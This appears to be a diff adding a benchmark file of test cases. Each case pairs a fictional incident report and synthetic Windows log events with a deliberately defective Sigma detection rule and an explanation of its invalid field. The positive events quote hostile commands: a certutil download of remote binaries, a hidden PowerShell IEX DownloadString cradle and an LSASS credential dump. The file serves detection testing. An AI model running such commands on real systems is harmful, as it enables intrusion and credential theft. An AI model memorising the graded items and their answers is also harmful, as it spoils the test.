@@ -1,0 +1,476 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\carol"
+     },
+     {
+      "cmd": "rundll32.exe printui.dll,PrintUIEntry /in /n\\\\printsrv01.harbourlight.test\\floor2",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\carol"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ipconfig.exe /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe C:\\Users\\Public\\Crane\\mediasync.dll,#1",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32.exe C:\\Users\\Public\\Crane\\mediasync.dll,#1",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c start",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "rundll32.exe C:\\Users\\Public\\Crane\\mediasync.dll,#1",
+    "legitimate software on these hosts always calls rundll32 with a named export such as shell32.dll,Control_RunDLL"
+   ],
+   "expected_gate": "G5",
+   "id": "D3-01",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident responders at the fictional Harbourlight Freight company observed a loader that abuses rundll32 to execute a dropped library without a visible window. After a phishing attachment was opened, the user's session ran rundll32.exe C:\\Users\\Public\\Crane\\mediasync.dll,#1 from a Word child process, which loaded the library by ordinal rather than by a named export. Analysts noted that legitimate software on these hosts always calls rundll32 with a named export such as shell32.dll,Control_RunDLL, so the ordinal-one invocation of a library from the Public profile was the discriminating feature. The same pattern recurred on four workstations within two hours. The library then beaconed to an external host over HTTPS. Responders recommend detecting rundll32 invocations that load a DLL from the Public profile by ordinal. The library was removed after the hosts were imaged.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 Loading Public Profile DLL By Ordinal\nid: 3b7e1c52-8a4d-4f19-9c60-2d5a7e813f04\nstatus: experimental\ndescription: Detects rundll32 loading a DLL from the Public profile through ordinal one, as seen in a phishing-delivered loader.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    NewProcessName|endswith: '\\rundll32.exe'\n  selection_cmd:\n    CommandLine|contains: 'mediasync.dll,#1'\n  condition: selection_img and selection_cmd\nfalsepositives:\n  - Third-party software that loads its own library by ordinal through rundll32\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.011"
+   ],
+   "why": "The detection uses NewProcessName, a Windows Security 4688 field name that is not in the allowed field list for process_creation (Image, CommandLine, ParentImage, ParentCommandLine, User, OriginalFileName); every other part of the rule is valid and backed by the quoted evidence."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.15",
+      "dest_port": "80",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.16",
+      "dest_port": "8080",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.10",
+      "dest_port": "443",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.24",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8443",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8443",
+      "image": "C:\\Windows\\SysWOW64\\mshta.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "mshta.exe, which normally never opens outbound sockets on these servers, connecting to the staging server relay-04.larkspur-cdn.test on TCP port 8443",
+    "Defenders should alert when mshta.exe connects out to relay-04.larkspur-cdn.test",
+    "The staging server resolved to 203.0.113.77 at the time of the incident."
+   ],
+   "expected_gate": "G5",
+   "id": "D3-02",
+   "logsource": "windows_network_connection",
+   "report_text": "Telemetry from the fictional Larkspur Logistics environment showed mshta.exe, which normally never opens outbound sockets on these servers, connecting to the staging server relay-04.larkspur-cdn.test on TCP port 8443 to retrieve an HTA payload. The staging server resolved to 203.0.113.77 at the time of the incident. The connection was initiated by an mshta.exe process launched from a scheduled maintenance script that had been altered. Analysts confirmed that mshta.exe was used only in this one case on the affected hosts during the preceding ninety days, and that the destination hostname did not appear in any proxy log before the intrusion. Defenders should alert when mshta.exe connects out to relay-04.larkspur-cdn.test, since the process has no business reason to reach external infrastructure from these hosts. The payload then launched a second-stage downloader.",
+   "role": "defective",
+   "sigma_yaml": "title: Mshta Outbound Connection To Staging Relay Host\nid: c84f2a96-1e07-4b3d-a5d2-6f90b71c4e28\nstatus: experimental\ndescription: Detects mshta.exe opening a connection to the staging relay hostname used to retrieve an HTA payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n    DestinationHostname|endswith: 'larkspur-cdn.test'\n  condition: selection\nfalsepositives:\n  - Administrators testing the staging relay from a managed workstation\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.005"
+   ],
+   "why": "The rule matches on DestinationHostname, a field that exists in the public Sigma network_connection specification but is not in this laboratory's allowed list for network_connection (Image, DestinationIp, DestinationPort, Initiated); the report also gives the destination IP 203.0.113.77, which could have been used with DestinationIp."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "psgallery-mirror.pennantbio.test"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "wiki.pennantbio.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.pennantbio.test"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "mfrgg43fmzsxi.ledger-sync.pennantbio.invalid"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "nbswy3dpeb3w6.ledger-sync.pennantbio.invalid"
+     }
+    ]
+   },
+   "evidence": [
+    "A PowerShell process repeatedly queried names under the zone ledger-sync.pennantbio.invalid at fixed 60-second intervals",
+    "Detection should key on powershell.exe resolving any name under ledger-sync.pennantbio.invalid"
+   ],
+   "expected_gate": "G5",
+   "id": "D3-03",
+   "logsource": "windows_dns_query",
+   "report_text": "Analysts at the fictional Pennant Biologics security operations team reviewed DNS client telemetry from a compromised file server. A PowerShell process repeatedly queried names under the zone ledger-sync.pennantbio.invalid at fixed 60-second intervals, with the first label carrying base32-encoded host data. These lookups were the only recurring external queries issued by powershell.exe on the host, which otherwise performs no name resolution of its own. The operators used the zone as a low-bandwidth command channel and read instructions from TXT answers. The beacon began shortly after a scheduled task was added and continued until the host was isolated. Detection should key on powershell.exe resolving any name under ledger-sync.pennantbio.invalid, because the zone has no legitimate business use and was registered only days before the intrusion.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Resolving Names Under Beacon Zone\nid: 5d1a9e30-7c42-4e8b-8f16-a3b2c9047d5e\nstatus: experimental\ndescription: Detects powershell.exe resolving names under the zone used as a DNS command channel.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    DnsQueryName|endswith: 'ledger-sync.pennantbio.invalid'\n  condition: selection\nfalsepositives:\n  - Security researchers resolving the zone from a managed analysis host\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "DnsQueryName differs from the allowed dns_query field QueryName only by the added prefix Dns; the allowed fields for dns_query are exactly Image and QueryName, so DnsQueryName is an invented field."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "certutil.exe -store My",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\CranePatch\\patchagent.exe",
+      "parent_cmd": "patchagent.exe --refresh",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "certutil.exe -hashfile C:\\Temp\\setup.msi SHA256",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\dave"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping.exe 192.0.2.1",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\carol"
+     },
+     {
+      "cmd": "tasklist.exe /svc",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dave"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://198.51.100.40/stage/agent.bin C:\\Users\\Public\\agent.bin",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\carol"
+     },
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://198.51.100.40/stage/helper.bin C:\\Users\\Public\\helper.bin",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dave"
+     }
+    ]
+   },
+   "evidence": [
+    "certutil.exe -urlcache -split -f http://198.51.100.40/stage/agent.bin C:\\Users\\Public\\agent.bin",
+    "flagging certutil.exe with the -urlcache switch together with -split, while excluding children of patchagent.exe"
+   ],
+   "expected_gate": "G5",
+   "id": "D3-04",
+   "logsource": "windows_process_creation",
+   "report_text": "A threat report on the fictional Wickham Textiles intrusion describes ingress tool transfer using certutil. The operator ran certutil.exe -urlcache -split -f http://198.51.100.40/stage/agent.bin C:\\Users\\Public\\agent.bin from an interactive cmd.exe session to pull a second-stage binary. Because certutil is also used on these hosts by the corporate patch agent for certificate refresh, the report notes that patchagent.exe legitimately launches certutil.exe but only with the -verify or -store switches and never with -urlcache. The responders therefore recommend flagging certutil.exe with the -urlcache switch together with -split, while excluding children of patchagent.exe. The downloaded binary was executed minutes later and established a reverse shell. Four other hosts showed the same command line with different file names.",
+   "role": "defective",
+   "sigma_yaml": "title: Certutil Urlcache Download Outside Patch Agent\nid: e2096b47-3f58-4a1c-b7d9-0c84a5e63f12\nstatus: experimental\ndescription: Detects certutil downloading a remote file with the urlcache and split switches, excluding children of the corporate patch agent.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    CommandLine|contains|all:\n      - '-urlcache'\n      - '-split'\n  filter_patch_agent:\n    ParentProcessName|endswith: '\\patchagent.exe'\n  condition: selection and not filter_patch_agent\nfalsepositives:\n  - Administrators downloading files with certutil for troubleshooting\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The positive selection uses only allowed fields, but the negated filter selection filter_patch_agent uses ParentProcessName, which is not an allowed process_creation field (ParentImage is); the invented field appears only inside 'not filter_patch_agent'."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.30",
+      "dest_port": "5985",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.7",
+      "dest_port": "443",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.8",
+      "dest_port": "443",
+      "image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.120",
+      "dest_port": "4444",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.120",
+      "dest_port": "4444",
+      "image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "A process named powershell.exe opened outbound TCP sessions to 203.0.113.120 on port 4444 roughly every ninety seconds",
+    "They recommend alerting on powershell.exe connecting to 203.0.113.120 on port 4444"
+   ],
+   "expected_gate": "G5",
+   "id": "D3-05",
+   "logsource": "windows_network_connection",
+   "report_text": "Network sensors at the fictional Marlowe Dairy Cooperative recorded a remote-access implant calling back on a non-standard port. A process named powershell.exe opened outbound TCP sessions to 203.0.113.120 on port 4444 roughly every ninety seconds, a port that is not associated with any approved service in the environment. The traffic carried no TLS handshake and the destination had no DNS name. The implant was started by a run key entry created during initial access. Responders found no other process on the affected hosts that contacted 203.0.113.120. They recommend alerting on powershell.exe connecting to 203.0.113.120 on port 4444, noting that PowerShell on these servers only contacts internal management hosts over port 5985. The same destination and port were seen on three other servers.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Callback To Implant Server On Port 4444\nid: 9a47d3f1-62b8-4c05-9e7a-1f3d58b0c6a4\nstatus: experimental\ndescription: Detects powershell.exe connecting to the implant server on the non-standard port used for callbacks.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    DestinationIP: '203.0.113.120'\n    DestinationPort: '4444'\n  condition: selection\nfalsepositives:\n  - Approved administrative tools that listen on port 4444 in a lab segment\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "The rule uses DestinationIP, which differs from the allowed network_connection field DestinationIp only in letter case; field names are case-sensitive exactly as written in the catalog, so DestinationIP is not an allowed field."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "procdump64.exe -accepteula -ma w3wp.exe C:\\Dumps\\w3wp.dmp",
+      "image": "C:\\Tools\\Sysinternals\\procdump64.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\opsadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "whoami.exe /all",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     },
+     {
+      "cmd": "hostname.exe",
+      "image": "C:\\Windows\\System32\\hostname.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\erin"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "svcstat.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\mem.dmp",
+      "image": "C:\\ProgramData\\Crane\\svcstat.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "svcstat.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\mem2.dmp",
+      "image": "C:\\ProgramData\\Crane\\svcstat.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ]
+   },
+   "evidence": [
+    "The operators staged the tool as svcstat.exe, with SHA256 9f2c41d7a85e03b6c1d4e8f7a2b95c30e6d1f4a7b8c92e05d3a6f1b48c7e9d02, and ran it as svcstat.exe -accepteula -ma lsass.exe against the LSASS process",
+    "Responders recommend detecting svcstat.exe launched with the -ma switch against lsass."
+   ],
+   "expected_gate": "G5",
+   "id": "D3-06",
+   "logsource": "windows_process_creation",
+   "report_text": "The fictional Orrin Marine Supply incident report details credential theft using a renamed memory-dump utility. The operators staged the tool as svcstat.exe, with SHA256 9f2c41d7a85e03b6c1d4e8f7a2b95c30e6d1f4a7b8c92e05d3a6f1b48c7e9d02, and ran it as svcstat.exe -accepteula -ma lsass.exe against the LSASS process on a domain member server. The resulting dump file was compressed and moved to a staging share. The original name of the tool, procdump.exe, was recovered from its version resources, but the renamed copy had no matching entry in the software inventory. Responders recommend detecting svcstat.exe launched with the -ma switch against lsass. Because the operators may rename the binary again, the report also lists the hash as an indicator of this specific build. Dumping activity was observed on two hosts.",
+   "role": "defective",
+   "sigma_yaml": "title: Renamed Memory Dump Utility Targeting LSASS\nid: 71c5e8a2-d094-4b6f-a38e-5b2f90d1c7e3\nstatus: experimental\ndescription: Detects the renamed memory-dump utility svcstat.exe launched against lsass, matching the known build hash.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.credential_access\n  - attack.t1003.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\svcstat.exe'\n    CommandLine|contains: '-ma lsass'\n    Hashes|contains: '9f2c41d7a85e03b6c1d4e8f7a2b95c30e6d1f4a7b8c92e05d3a6f1b48c7e9d02'\n  condition: selection\nfalsepositives:\n  - Administrators who copy a dump utility under the same name for troubleshooting\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1003.001"
+   ],
+   "why": "The selection uses Hashes, which is not an allowed process_creation field in this laboratory's catalog (Image, CommandLine, ParentImage, ParentCommandLine, User, OriginalFileName); the hash value is quoted in the report but the field cannot be evaluated against the available telemetry."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D3",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\CraneAgent\\mgmtagent.exe",
+      "parent_cmd": "mgmtagent.exe --run-job inventory",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "powershell.exe -NoProfile Invoke-WebRequest -Uri https://intranet.quillon.test/inventory.csv -OutFile C:\\Temp\\inventory.csv",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\opsadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig.exe /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\frank"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\gina\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\gina"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n",
+      "user": "LAB\\frank"
+     },
+     {
+      "cmd": "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "parent_cmd": "EXCEL.EXE /e",
+      "user": "LAB\\gina"
+     }
+    ]
+   },
+   "evidence": [
+    "powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')",
+    "the DownloadString call combined with IEX is the common structure across the campaign's samples"
+   ],
+   "expected_gate": "G5",
+   "id": "D3-07",
+   "logsource": "windows_process_creation",
+   "report_text": "Responders at the fictional Quillon Insurance Group traced an infection to a malicious Word macro that launched a PowerShell download cradle. The macro started powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1') so that the second stage ran entirely in memory and never touched disk. The report observes that the DownloadString call combined with IEX is the common structure across the campaign's samples, and the identical expression was seen on seven workstations in one afternoon. The script retrieved from the staging address enumerated local accounts and then installed a scheduled task for persistence. Administrators at the firm routinely run PowerShell for inventory collection, but those jobs are launched from the management agent and never download remote scripts into an expression evaluator. Analysts propose a process-creation detection for PowerShell command lines that pair IEX with DownloadString.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Download Cradle With IEX And DownloadString\nid: f08b3d65-a1c7-4e92-8b04-7d6e2a9c15b8\nstatus: experimental\ndescription: Detects PowerShell launched with an IEX expression that evaluates the output of a DownloadString call.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    ScriptBlockText|contains|all:\n      - 'DownloadString'\n      - 'IEX'\n  condition: selection\nfalsepositives:\n  - Administrators testing in-memory script retrieval from an approved internal server\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001"
+   ],
+   "why": "ScriptBlockText belongs to the PowerShell script-block log source, which is unavailable here, and is not an allowed field for a process_creation rule; the same text is present in the CommandLine field that process_creation does provide."
+  }
+ ]
+}
